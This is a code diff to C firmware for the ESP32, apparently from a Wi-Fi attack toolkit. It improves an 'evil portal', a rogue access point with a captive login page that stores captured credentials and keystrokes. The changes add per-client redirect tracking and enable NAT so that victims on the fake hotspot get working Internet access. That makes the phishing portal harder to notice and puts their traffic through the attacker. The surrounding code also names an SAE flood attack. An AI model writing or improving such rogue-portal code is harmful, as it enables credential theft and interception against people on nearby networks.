@@ -36,6 +36,8 @@
 #include <inttypes.h>
 #include "managers/default_portal.h"
 #include "freertos/task.h"
+#include <sys/socket.h>
+#include <netinet/in.h>
 
 // Defines for Station Scan Channel Hopping
 #define SCANSTA_CHANNEL_HOP_INTERVAL_MS 250 // Hop channel every 250ms
@@ -812,7 +814,11 @@ esp_err_t file_handler(httpd_req_t *req) {
 }
 
 esp_err_t done_handler(httpd_req_t *req) {
-    login_done = true;
+    // Mark this specific client as logged-in so we stop redirecting it
+    ep_client_status_t *cli = get_ep_client_status(req);
+    if (cli) {
+        cli->logged_in = true;
+    }
     const char *msg = "<html><body><h1>Portal closed</h1></body></html>";
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, msg, strlen(msg));
@@ -926,18 +932,24 @@ esp_err_t get_info_handler(httpd_req_t *req) {
 
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
-    if (login_done) {
+
+    ep_client_status_t *cli = get_ep_client_status(req);
+    if (cli && cli->logged_in) {
         httpd_resp_set_status(req, "204 No Content");
         httpd_resp_send(req, NULL, 0);
         return ESP_OK;
     }
+
     const char *uri = req->uri;
     if (strcmp(uri, "/generate_204") == 0 || strcmp(uri, "/hotspot-detect.html") == 0 || strcmp(uri, "/connecttest.txt") == 0) {
-        httpd_resp_set_status(req, "301 Moved Permanently");
-        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
-        httpd_resp_send(req, NULL, 0);
-        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
-        return ESP_OK;
+        if (cli && !cli->redirected) {
+            cli->redirected = true; // first time – force captive portal
+            httpd_resp_set_status(req, "301 Moved Permanently");
+            httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
+            httpd_resp_send(req, NULL, 0);
+            ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+            return ESP_OK;
+        }
     }
     // minimal logging for captive probe
 
@@ -1116,6 +1128,19 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
         printf("Failed to start DNS server\n");
     }
     
+    // Enable NAT – this turns the ESP32 into a miniature router so that
+    // stations connected to the Evil AP can reach the Internet via the
+    // existing STA interface.  Available in ESP-IDF ≥4.4.
+    if (!nat_enabled) {
+        esp_err_t nat_err = esp_netif_nat_enable(wifiAP, wifiSTA);
+        if (nat_err == ESP_OK) {
+            nat_enabled = true;
+            printf("NAT enabled (AP → STA)\n");
+        } else {
+            printf("Failed to enable NAT: %s\n", esp_err_to_name(nat_err));
+        }
+    }
+    
     return ESP_OK; // Add return value at the end
 }
 
@@ -1123,6 +1148,12 @@ void wifi_manager_stop_evil_portal() {
     login_done = false; // Reset login state on stop
     current_creds_filename[0] = '\0'; // Clear saved filenames
     current_keystrokes_filename[0] = '\0';
+
+    // Disable NAT if active
+    if (nat_enabled) {
+        esp_netif_nat_disable(wifiAP, wifiSTA);
+        nat_enabled = false;
+    }
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
@@ -4048,3 +4079,45 @@ void wifi_manager_sae_flood_help(void) {
     printf("Commands: saeflood, stopsaeflood, saefloodhelp\n");
     TERMINAL_VIEW_ADD_TEXT("Commands: saeflood, stopsaeflood, saefloodhelp\n");
 }
+
+// --- Added for NAT + selective redirection ---------------------------
+#define MAX_EP_CLIENTS 20
+
+typedef struct {
+    uint32_t ip;          // client IPv4 in network byte order
+    bool redirected;      // we already sent the first 302
+    bool logged_in;       // client visited /done
+} ep_client_status_t;
+
+static ep_client_status_t ep_clients[MAX_EP_CLIENTS];
+static bool nat_enabled = false;
+//---------------------------------------------------------------------
+
+// ------------------ Helper for selective redirect --------------------
+static ep_client_status_t *get_ep_client_status(httpd_req_t *req) {
+    int sock = httpd_req_to_sockfd(req);
+    struct sockaddr_in peer;
+    socklen_t len = sizeof(peer);
+    if (getpeername(sock, (struct sockaddr *)&peer, &len) != 0) {
+        return NULL;
+    }
+    uint32_t ip = peer.sin_addr.s_addr;
+
+    // Search existing entry
+    for (int i = 0; i < MAX_EP_CLIENTS; ++i) {
+        if (ep_clients[i].ip == ip) {
+            return &ep_clients[i];
+        }
+    }
+    // Allocate new slot if free
+    for (int i = 0; i < MAX_EP_CLIENTS; ++i) {
+        if (ep_clients[i].ip == 0) {
+            ep_clients[i].ip = ip;
+            ep_clients[i].redirected = false;
+            ep_clients[i].logged_in = false;
+            return &ep_clients[i];
+        }
+    }
+    return NULL; // table full – will behave as global redirect
+}
+ //---------------------------------------------------------------------
